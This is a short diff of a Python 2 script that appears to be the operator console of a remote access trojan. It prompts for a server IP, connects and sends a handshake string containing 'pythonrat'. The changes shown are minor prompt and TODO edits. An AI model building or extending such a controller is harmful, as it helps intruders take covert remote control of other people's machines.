@@ -36,10 +36,9 @@ def listen(connection, host):
 
 def main():
     connection = socket.socket()
-
+    print HELPPROMPT
     while True:
-        os.system('/usr/bin/clear')
-        print HELPPROMPT
+        #TODO fix clear prompt
         cmd = raw_input("ECHI.localhost> ").lower()
 
         if cmd == "help":
@@ -49,7 +48,7 @@ def main():
             host = raw_input("Enter server IP address: ")
 
             try:
-
+                #TODO Thread client session
                 connection.connect((host, PORT))
                 connection.send("gunclawpythonratniBBa")
                 listen(connection, host)
